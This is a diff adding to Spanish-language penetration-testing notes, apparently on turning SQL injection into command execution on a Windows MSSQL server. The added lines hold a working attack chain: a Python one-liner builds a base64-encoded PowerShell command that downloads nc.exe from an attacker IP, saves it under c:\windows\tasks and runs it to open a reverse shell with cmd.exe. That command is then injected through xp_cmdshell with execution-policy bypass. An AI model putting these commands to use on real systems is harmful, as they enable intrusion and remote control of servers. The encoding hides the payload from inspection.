@@ -29,3 +29,14 @@ Luego enviamos el ping:
 Podemos usar revshell para generar reverseshells de manera sencilla:
 
     https://www.revshells.com/
+#### En el caso de que la reverse no funcione:
+
+Deberemos subir un netcat u otro binario util para realizar conexiones al servidor
+
+1. Generamos el payload para que se descargue nuestro binario de manera ofuscada
+   
+        python3 -c 'import base64; print(base64.b64encode((r"""(new-object net.webclient).downloadfile("http://192.168.43.164/nc.exe", "c:\windows\tasks\nc.exe"); c:\windows\tasks\nc.exe -nv 192.168.43.164 9999 -e c:\windows\system32\cmd.exe;""").encode("utf-16-le")).decode())'
+
+2. pasamos como comando en la inyección:
+
+       exec xp_cmdshell 'powershell -exec bypass -enc <payload>'
